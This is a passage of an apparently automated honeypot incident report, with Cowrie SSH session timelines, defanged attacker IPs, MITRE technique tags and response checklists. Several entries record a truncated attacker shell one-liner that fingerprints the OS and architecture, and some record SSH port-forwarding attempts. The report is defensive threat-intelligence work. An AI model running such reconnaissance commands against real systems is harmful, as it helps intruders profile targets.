- [ ] Block `112.168.1[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101af830d95e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:45 |
| **Last Seen** | 2026-08-01 09:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:45:42` | `cowrie.session.connect` |
| `2026-08-01 09:45:43` | `cowrie.client.version` |
| `2026-08-01 09:45:43` | `cowrie.client.kex` |
| `2026-08-01 09:45:48` | `cowrie.login.success` |
| `2026-08-01 09:45:50` | `cowrie.session.params` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.success` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:50` | `cowrie.command.input` |
| `2026-08-01 09:45:51` | `cowrie.log.closed` |
| `2026-08-01 09:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745ef0c34e09

| Field | Detail |
|---|---|
| **Source IP** | `36.135.62[.]103` |
| **First Seen** | 2026-08-01 09:46 |
| **Last Seen** | 2026-08-01 09:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:46:14` | `cowrie.session.connect` |
| `2026-08-01 09:46:15` | `cowrie.client.version` |
| `2026-08-01 09:46:15` | `cowrie.client.kex` |
| `2026-08-01 09:46:19` | `cowrie.login.success` |
| `2026-08-01 09:46:20` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.135.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `36.135.62[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1036164c6029

| Field | Detail |
|---|---|
| **Source IP** | `203.129.225[.]4` |
| **First Seen** | 2026-08-01 09:46 |
| **Last Seen** | 2026-08-01 09:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:46:30` | `cowrie.session.connect` |
| `2026-08-01 09:46:31` | `cowrie.client.version` |
| `2026-08-01 09:46:31` | `cowrie.client.kex` |
| `2026-08-01 09:46:32` | `cowrie.login.success` |
| `2026-08-01 09:46:33` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.225[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.129.225[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53bfb430d2d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:46 |
| **Last Seen** | 2026-08-01 09:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:46:54` | `cowrie.session.connect` |
| `2026-08-01 09:46:55` | `cowrie.client.version` |
| `2026-08-01 09:46:55` | `cowrie.client.kex` |
| `2026-08-01 09:46:57` | `cowrie.login.success` |
| `2026-08-01 09:46:59` | `cowrie.session.params` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.success` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:46:59` | `cowrie.command.input` |
| `2026-08-01 09:47:00` | `cowrie.log.closed` |
| `2026-08-01 09:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0767d86a044e

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 09:47 |
| **Last Seen** | 2026-08-01 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:47:09` | `cowrie.session.connect` |
| `2026-08-01 09:47:09` | `cowrie.client.version` |
| `2026-08-01 09:47:09` | `cowrie.client.kex` |
| `2026-08-01 09:47:10` | `cowrie.login.success` |
| `2026-08-01 09:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0423d968107

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:48 |
| **Last Seen** | 2026-08-01 09:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:48:03` | `cowrie.session.connect` |
| `2026-08-01 09:48:03` | `cowrie.client.version` |
| `2026-08-01 09:48:03` | `cowrie.client.kex` |
| `2026-08-01 09:48:06` | `cowrie.login.success` |
| `2026-08-01 09:48:08` | `cowrie.session.params` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.success` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:08` | `cowrie.command.input` |
| `2026-08-01 09:48:09` | `cowrie.log.closed` |
| `2026-08-01 09:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45ba7b8d0c38

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 09:48 |
| **Last Seen** | 2026-08-01 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:48:32` | `cowrie.session.connect` |
| `2026-08-01 09:48:32` | `cowrie.client.version` |
| `2026-08-01 09:48:32` | `cowrie.client.kex` |
| `2026-08-01 09:48:32` | `cowrie.login.success` |
| `2026-08-01 09:48:32` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:48:32` | `cowrie.direct-tcpip.data` |
| `2026-08-01 09:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6816f7a740

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:49 |
| **Last Seen** | 2026-08-01 09:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:49:12` | `cowrie.session.connect` |
| `2026-08-01 09:49:13` | `cowrie.client.version` |
| `2026-08-01 09:49:13` | `cowrie.client.kex` |
| `2026-08-01 09:49:15` | `cowrie.login.success` |
| `2026-08-01 09:49:17` | `cowrie.session.params` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.success` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:17` | `cowrie.command.input` |
| `2026-08-01 09:49:18` | `cowrie.log.closed` |
| `2026-08-01 09:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4d8d4026a6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:50 |
| **Last Seen** | 2026-08-01 09:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:50:25` | `cowrie.session.connect` |
| `2026-08-01 09:50:25` | `cowrie.client.version` |
| `2026-08-01 09:50:25` | `cowrie.client.kex` |
| `2026-08-01 09:50:28` | `cowrie.login.success` |
| `2026-08-01 09:50:30` | `cowrie.session.params` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.success` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:30` | `cowrie.command.input` |
| `2026-08-01 09:50:31` | `cowrie.log.closed` |
| `2026-08-01 09:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65380c65aa65

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:51 |
| **Last Seen** | 2026-08-01 09:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:51:40` | `cowrie.session.connect` |
| `2026-08-01 09:51:41` | `cowrie.client.version` |
| `2026-08-01 09:51:41` | `cowrie.client.kex` |
| `2026-08-01 09:51:43` | `cowrie.login.success` |
| `2026-08-01 09:51:45` | `cowrie.session.params` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.success` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:45` | `cowrie.command.input` |
| `2026-08-01 09:51:46` | `cowrie.log.closed` |
| `2026-08-01 09:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25ef246df57

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:52 |
| **Last Seen** | 2026-08-01 09:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:52:58` | `cowrie.session.connect` |
| `2026-08-01 09:52:59` | `cowrie.client.version` |
| `2026-08-01 09:52:59` | `cowrie.client.kex` |
| `2026-08-01 09:53:01` | `cowrie.login.success` |
| `2026-08-01 09:53:03` | `cowrie.session.params` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.success` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:03` | `cowrie.command.input` |
| `2026-08-01 09:53:04` | `cowrie.log.closed` |
| `2026-08-01 09:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd8ca0c1b7b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:54 |
| **Last Seen** | 2026-08-01 09:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:54:15` | `cowrie.session.connect` |
| `2026-08-01 09:54:15` | `cowrie.client.version` |
| `2026-08-01 09:54:15` | `cowrie.client.kex` |
| `2026-08-01 09:54:18` | `cowrie.login.success` |
| `2026-08-01 09:54:20` | `cowrie.session.params` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.success` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:20` | `cowrie.command.input` |
| `2026-08-01 09:54:21` | `cowrie.log.closed` |
| `2026-08-01 09:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f665c857bffc

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]35` |
| **First Seen** | 2026-08-01 09:54 |
| **Last Seen** | 2026-08-01 09:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:54:44` | `cowrie.session.connect` |
| `2026-08-01 09:54:45` | `cowrie.client.version` |
| `2026-08-01 09:54:45` | `cowrie.client.kex` |
| `2026-08-01 09:54:47` | `cowrie.login.success` |
| `2026-08-01 09:54:47` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]35` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8770f3b62f0a

| Field | Detail |
|---|---|
| **Source IP** | `110.227.215[.]90` |
| **First Seen** | 2026-08-01 09:54 |
| **Last Seen** | 2026-08-01 09:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:54:53` | `cowrie.session.connect` |
| `2026-08-01 09:54:53` | `cowrie.client.version` |
| `2026-08-01 09:54:53` | `cowrie.client.kex` |
| `2026-08-01 09:54:56` | `cowrie.login.success` |
| `2026-08-01 09:54:56` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.215[.]90` to AbuseIPDB if not already reported
- [ ] Block `110.227.215[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-247e9ddae88c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:55 |
| **Last Seen** | 2026-08-01 09:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:55:32` | `cowrie.session.connect` |
| `2026-08-01 09:55:32` | `cowrie.client.version` |
| `2026-08-01 09:55:32` | `cowrie.client.kex` |
| `2026-08-01 09:55:34` | `cowrie.login.success` |
| `2026-08-01 09:55:36` | `cowrie.session.params` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.success` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.command.input` |
| `2026-08-01 09:55:36` | `cowrie.log.closed` |
| `2026-08-01 09:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c938bcd79b48

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:56 |
| **Last Seen** | 2026-08-01 09:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
